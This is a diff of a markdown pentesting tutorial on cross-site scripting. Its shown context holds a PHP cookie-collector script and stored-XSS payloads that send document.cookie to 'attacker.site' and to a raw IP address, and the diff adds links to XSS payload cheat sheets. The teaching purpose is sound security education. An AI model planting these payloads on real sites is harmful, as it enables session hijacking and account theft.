@@ -15,6 +15,8 @@ tag: pentesting, webpentesting
 # 3. Test with HTML/JavaScript code (alert('XSS'))
 ```
 
+But, of course, you may use an extensive repository of payloads.
+
 
 ## Cross-Site Scripting XSS: reflected, persistent or DOM based
 
@@ -63,11 +65,11 @@ Now, this script save the cookie in a text file on the attacker site:
 
 ## Example of an attack
 
-The attacker creates a get.php file and saves it into its server. 
+1. The attacker creates a get.php file and saves it into its server. 
 
-This php file will store the data that the attacker server receives into a file.
+2. This php file will store the data that the attacker server receives into a file.
 
-This could be the content of the get.php file:
+3. This could be the content of the get.php file:
 
 ```php
 <?php
@@ -82,7 +84,7 @@ fclose($fp);
 ?>
 ```
 
-Now in the web server the attacker achieve to store this payload:
+4. Now in the web server the attacker achieve to store this payload:
 
 ```html
 <script>
@@ -92,10 +94,18 @@ i.src = “http://attacker.site/get.php?cookie=”+escape(document.cookie);
 
 # Or in one line:
 <script>var i = new Image(); i.src = “http://10.86.74.7/moville.php?cookie=”+escape(document.cookie); </script>
-``` 
+```
+ 
 
 ## Tools and payloads
 
-- See updated chart: [Attacks and tools for web pentesting](index-attacks-tools-web-pentesting.md).
++ See updated chart: [Attacks and tools for web pentesting](index-attacks-tools-web-pentesting.md).
++ Vectors (payload) regularly updated: [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).
++ OWASP Cheat Sheet series: XSS Filter Evasion Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html).
+ 
+
+
+
+
 
 
